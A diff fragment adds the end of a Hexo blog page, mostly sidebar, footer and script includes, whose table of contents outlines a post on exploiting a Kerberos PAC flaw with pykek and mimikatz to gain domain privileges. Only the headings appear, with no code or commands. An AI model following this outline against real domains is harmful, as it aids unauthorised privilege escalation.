+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84SID%E3%80%81%E5%9F%9F%E6%8E%A7%E4%B8%BB%E6%9C%BAgroup"><span class="nav-number">2.1.</span> <span class="nav-text">获取域用户的SID、域控主机group</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pykek%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.</span> <span class="nav-text">使用pykek的漏洞利用程序进行攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E7%BC%93%E5%AD%98%E8%AF%81%E4%B9%A6%EF%BC%8Cmimikatz%E5%86%99%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">清除缓存证书，mimikatz写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E9%AB%98%E6%9D%83%E9%99%90%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.4.</span> <span class="nav-text">请求高权限服务</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞细节分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PAC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3"><span class="nav-number">3.1.</span> <span class="nav-text">PAC的一些理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞利用的流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0AS-REQ"><span class="nav-number">3.3.</span> <span class="nav-text">构造AS_REQ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A5%E6%94%B6AS-REP"><span class="nav-number">3.4.</span> <span class="nav-text">接收AS_REP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0PAC"><span class="nav-number">3.5.</span> <span class="nav-text">构造PAC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0TGS-REQ"><span class="nav-number">3.6.</span> <span class="nav-text">构造TGS_REQ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A5%E6%94%B6TGS-REP"><span class="nav-number">3.7.</span> <span class="nav-text">接收TGS-REP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8D%A2%E5%8F%96ST"><span class="nav-number">3.8.</span> <span class="nav-text">换取ST</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">coco17ut</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
